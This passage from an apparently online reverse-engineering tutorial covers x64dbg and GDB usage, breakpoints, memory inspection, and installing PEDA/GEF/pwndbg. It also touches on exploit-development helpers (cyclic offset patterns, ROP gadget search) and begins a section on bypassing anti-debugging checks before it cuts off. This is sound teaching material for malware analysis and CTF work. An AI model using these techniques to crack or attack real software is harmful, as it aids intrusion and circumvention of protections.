<table><thead><tr><th>Debugger</th><th>Platform</th><th>Best For</th></tr></thead><tbody><tr><td><strong>x64dbg</strong></td><td>Windows</td><td>User-mode debugging, malware analysis, CTF</td></tr><tr><td><strong>WinDbg</strong></td><td>Windows</td><td>Kernel debugging, crash dumps, advanced Windows internals</td></tr><tr><td><strong>GDB</strong></td><td>Linux, macOS</td><td>Linux/macOS binaries, exploit development, scriptable with Python</td></tr><tr><td><strong>LLDB</strong></td><td>macOS, Linux</td><td>macOS/iOS debugging, modern alternative to GDB</td></tr><tr><td><strong>OllyDbg</strong></td><td>Windows</td><td>Legacy 32-bit Windows debugging (x64dbg is successor)</td></tr><tr><td><strong>IDA Pro Debugger</strong></td><td>Windows, Linux, macOS</td><td>Integrated with IDA disassembly</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="x64dbg-basics">x64dbg Basics<a href="#x64dbg-basics" class="hash-link" aria-label="Direct link to x64dbg Basics" title="Direct link to x64dbg Basics" translate="no">​</a></h3>
<p><strong>Launching x64dbg:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Windows: Launch x32dbg.exe (32-bit) or x64dbg.exe (64-bit)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x64dbg.exe malware.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Or: File → Open → Select binary</span><br></span></code></pre></div></div>
<p><strong>x64dbg interface:</strong></p>
<p><strong>1. CPU view (disassembly):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">00401000 | 55                 | push ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00401001 | 8B EC              | mov ebp, esp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00401003 | 83 EC 20           | sub esp, 0x20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00401006 | C7 45 FC 00 00 00 00 | mov dword ptr [ebp-4], 0</span><br></span></code></pre></div></div>
<p><strong>2. Registers:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">RAX = 0000000000000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RBX = 0000000000000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RCX = 0000000000401000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RDX = 0000000000000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RSP = 000000000012FF00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RBP = 000000000012FF20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RIP = 0000000000401000  &lt;-- Current instruction</span><br></span></code></pre></div></div>
<p><strong>3. Stack:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Address       Value             Comment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0012FF00      00000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0012FF04      00401050          Return address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0012FF08      00000001          Argument 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0012FF0C      00402000          Argument 2</span><br></span></code></pre></div></div>
<p><strong>4. Memory dump:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Address   Hex                               ASCII</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00402000  48 65 6C 6C 6F 20 57 6F 72 6C 64  Hello World</span><br></span></code></pre></div></div>
<p><strong>Setting breakpoints:</strong></p>
<p><strong>1. Software breakpoint (F2):</strong></p>
<ul>
<li class="">Click on instruction → Press <strong>F2</strong> (or right-click → Breakpoint → Toggle)</li>
<li class="">Breaks when instruction is executed</li>
<li class=""><strong>Use case:</strong> Break on function entry, suspicious API calls</li>
</ul>
<p><strong>2. Hardware breakpoint:</strong></p>
<ul>
<li class=""><strong>Debug → Hardware breakpoints</strong></li>
<li class="">Up to 4 hardware breakpoints (CPU limitation)</li>
<li class="">Can break on <strong>execution</strong>, <strong>read</strong>, or <strong>write</strong> of memory address</li>
<li class=""><strong>Use case:</strong> Break when memory is modified (anti-debugging detection)</li>
</ul>
<p><strong>3. Memory breakpoint:</strong></p>
<ul>
<li class="">Right-click in memory dump → <strong>Breakpoint → Memory Access</strong> (read/write/execute)</li>
<li class=""><strong>Use case:</strong> Track when buffer is written, monitor heap allocations</li>
</ul>
<p><strong>4. Conditional breakpoint:</strong></p>
<ul>
<li class="">Right-click on breakpoint → <strong>Edit</strong></li>
<li class="">Set condition (e.g., <code>RAX == 0x42</code>)</li>
<li class=""><strong>Use case:</strong> Break only when specific value is encountered</li>
</ul>
<p><strong>x64dbg commands (command line at bottom):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Execution control:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run                    </span><span class="token comment" style="color:#999988;font-style:italic"># Start execution</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">StepInto               </span><span class="token comment" style="color:#999988;font-style:italic"># F7 - Step into function call</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">StepOver               </span><span class="token comment" style="color:#999988;font-style:italic"># F8 - Step over function call</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">StepOut                </span><span class="token comment" style="color:#999988;font-style:italic"># Ctrl+F9 - Run until return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RunToUser              </span><span class="token comment" style="color:#999988;font-style:italic"># Alt+F9 - Run until user code (skip system DLLs)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Breakpoints:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bp </span><span class="token number" style="color:#36acaa">401000</span><span class="token plain">              </span><span class="token comment" style="color:#999988;font-style:italic"># Set breakpoint at address 0x401000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bp CreateFileA         </span><span class="token comment" style="color:#999988;font-style:italic"># Set breakpoint on function</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">bc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">401000</span><span class="token plain">              </span><span class="token comment" style="color:#999988;font-style:italic"># Clear breakpoint</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bl                     </span><span class="token comment" style="color:#999988;font-style:italic"># List breakpoints</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Memory:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dump </span><span class="token number" style="color:#36acaa">402000</span><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic"># Show memory dump at address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d eax                  </span><span class="token comment" style="color:#999988;font-style:italic"># Dump memory at address in EAX</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db </span><span class="token number" style="color:#36acaa">402000</span><span class="token plain">              </span><span class="token comment" style="color:#999988;font-style:italic"># Dump bytes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">402000</span><span class="token plain">              </span><span class="token comment" style="color:#999988;font-style:italic"># Dump dwords</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">da </span><span class="token number" style="color:#36acaa">402000</span><span class="token plain">              </span><span class="token comment" style="color:#999988;font-style:italic"># Dump ASCII string</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Registers:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r eax </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">42</span><span class="token plain">             </span><span class="token comment" style="color:#999988;font-style:italic"># Set EAX to 0x42</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r rip </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">401000</span><span class="token plain">         </span><span class="token comment" style="color:#999988;font-style:italic"># Set instruction pointer (change execution flow)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Search:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">402000</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">&quot;password&quot;</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># Search for string in memory</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">findall </span><span class="token string" style="color:#e3116c">&quot;http://&quot;</span><span class="token plain">         </span><span class="token comment" style="color:#999988;font-style:italic"># Find all occurrences</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Comments:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmt </span><span class="token number" style="color:#36acaa">401000</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">&quot;Main function starts here&quot;</span><br></span></code></pre></div></div>
<p><strong>Tracing execution:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Trace into (log every instruction):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TraceIntoConditional rax </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Trace over (log every function call):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TraceOverConditional</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Run trace (high-speed logging):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Debug → Run Trace → Start</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Generates trace log for later analysis</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="gdb-basics">GDB Basics<a href="#gdb-basics" class="hash-link" aria-label="Direct link to GDB Basics" title="Direct link to GDB Basics" translate="no">​</a></h3>
<p><strong>Launching GDB:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Linux: Debug ELF binary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb ./program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Attach to running process:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">lt</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">PID</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">gt</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># With arguments:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb </span><span class="token parameter variable" style="color:#36acaa">--args</span><span class="token plain"> ./program arg1 arg2</span><br></span></code></pre></div></div>
<p><strong>GDB commands:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Execution control:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run                    </span><span class="token comment" style="color:#999988;font-style:italic"># Start execution (or &quot;r&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">continue</span><span class="token plain">               </span><span class="token comment" style="color:#999988;font-style:italic"># Continue execution (or &quot;c&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">step                   </span><span class="token comment" style="color:#999988;font-style:italic"># Step into (single instruction, or &quot;s&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">next                   </span><span class="token comment" style="color:#999988;font-style:italic"># Step over (or &quot;n&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stepi                  </span><span class="token comment" style="color:#999988;font-style:italic"># Step single assembly instruction (or &quot;si&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexti                  </span><span class="token comment" style="color:#999988;font-style:italic"># Step over single assembly instruction (or &quot;ni&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">finish                 </span><span class="token comment" style="color:#999988;font-style:italic"># Run until function returns</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Breakpoints:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">break</span><span class="token plain"> main             </span><span class="token comment" style="color:#999988;font-style:italic"># Break at function &quot;main&quot; (or &quot;b main&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">break</span><span class="token plain"> *0x401000        </span><span class="token comment" style="color:#999988;font-style:italic"># Break at address 0x401000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">break</span><span class="token plain"> file.c:42        </span><span class="token comment" style="color:#999988;font-style:italic"># Break at source line (if symbols available)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">info breakpoints       </span><span class="token comment" style="color:#999988;font-style:italic"># List breakpoints (or &quot;info b&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">delete </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">               </span><span class="token comment" style="color:#999988;font-style:italic"># Delete breakpoint 1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disable </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">              </span><span class="token comment" style="color:#999988;font-style:italic"># Disable breakpoint 1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">enable</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">               </span><span class="token comment" style="color:#999988;font-style:italic"># Enable breakpoint 1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Watchpoints (break on memory access):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">watch</span><span class="token plain"> *0x601000        </span><span class="token comment" style="color:#999988;font-style:italic"># Break when memory at 0x601000 is written</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rwatch *0x601000       </span><span class="token comment" style="color:#999988;font-style:italic"># Break when memory is read</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">awatch *0x601000       </span><span class="token comment" style="color:#999988;font-style:italic"># Break when memory is read or written</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Examining memory:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x/10i </span><span class="token variable" style="color:#36acaa">$rip</span><span class="token plain">             </span><span class="token comment" style="color:#999988;font-style:italic"># Examine 10 instructions at RIP (disassembly)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x/10x </span><span class="token variable" style="color:#36acaa">$rsp</span><span class="token plain">             </span><span class="token comment" style="color:#999988;font-style:italic"># Examine 10 hex values at RSP (stack)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x/s 0x401000           </span><span class="token comment" style="color:#999988;font-style:italic"># Examine string at address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x/10gx </span><span class="token variable" style="color:#36acaa">$rsp</span><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic"># Examine 10 giant (8-byte) hex values</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Registers:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">info registers         </span><span class="token comment" style="color:#999988;font-style:italic"># Show all registers (or &quot;info r&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print </span><span class="token variable" style="color:#36acaa">$rax</span><span class="token plain">             </span><span class="token comment" style="color:#999988;font-style:italic"># Print RAX value (or &quot;p $rax&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$rax</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> 0x42        </span><span class="token comment" style="color:#999988;font-style:italic"># Set RAX to 0x42</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Disassembly:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disassemble main       </span><span class="token comment" style="color:#999988;font-style:italic"># Disassemble function &quot;main&quot; (or &quot;disas main&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disassemble 0x401000   </span><span class="token comment" style="color:#999988;font-style:italic"># Disassemble at address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Backtrace (call stack):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">backtrace              </span><span class="token comment" style="color:#999988;font-style:italic"># Show call stack (or &quot;bt&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">frame </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic"># Switch to frame 2 in call stack</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">info frame             </span><span class="token comment" style="color:#999988;font-style:italic"># Show current frame info</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Search memory:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> 0x400000, +0x10000, </span><span class="token string" style="color:#e3116c">&quot;password&quot;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Search for string</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># GDB-specific:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> disassembly-flavor intel  </span><span class="token comment" style="color:#999988;font-style:italic"># Use Intel syntax (default is AT&amp;T)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">layout asm             </span><span class="token comment" style="color:#999988;font-style:italic"># Show TUI (Text UI) with disassembly</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">layout regs            </span><span class="token comment" style="color:#999988;font-style:italic"># Show TUI with registers</span><br></span></code></pre></div></div>
<p><strong>GDB with PEDA/GEF/pwndbg (enhanced plugins):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Install PEDA (Python Exploit Development Assistance):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/longld/peda.git ~/peda</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;source ~/peda/peda.py&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> ~/.gdbinit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Install GEF (GDB Enhanced Features):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-O</span><span class="token plain"> ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;source ~/.gdbinit-gef.py&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> ~/.gdbinit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Install pwndbg:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/pwndbg/pwndbg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> pwndbg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./setup.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># PEDA/GEF/pwndbg add commands:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">checksec               </span><span class="token comment" style="color:#999988;font-style:italic"># Check binary protections (NX, PIE, RELRO, Canary)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vmmap                  </span><span class="token comment" style="color:#999988;font-style:italic"># Show memory mappings</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">telescope </span><span class="token variable" style="color:#36acaa">$rsp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic"># Show stack with dereferenced pointers</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pattern create </span><span class="token number" style="color:#36acaa">200</span><span class="token plain">     </span><span class="token comment" style="color:#999988;font-style:italic"># Create cyclic pattern for finding offsets</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pattern offset 0x41614141  </span><span class="token comment" style="color:#999988;font-style:italic"># Find offset of pattern in EIP/RIP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop                    </span><span class="token comment" style="color:#999988;font-style:italic"># Search for ROP gadgets</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="bypassing-anti-debugging">Bypassing Anti-Debugging<a href="#bypassing-anti-debugging" class="hash-link" aria-label="Direct link to Bypassing Anti-Debugging" title="Direct link to Bypassing Anti-Debugging" translate="no">​</a></h3>
<p><strong>Anti-debugging techniques:</strong></p>
<p><strong>1. IsDebuggerPresent (Windows):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Check if debugger is attached</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call IsDebuggerPresent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test eax, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jnz debugger_detected   ; Jump if EAX != 0 (debugger present)</span><br></span></code></pre></div></div>
<p><strong>Bypass:</strong></p>
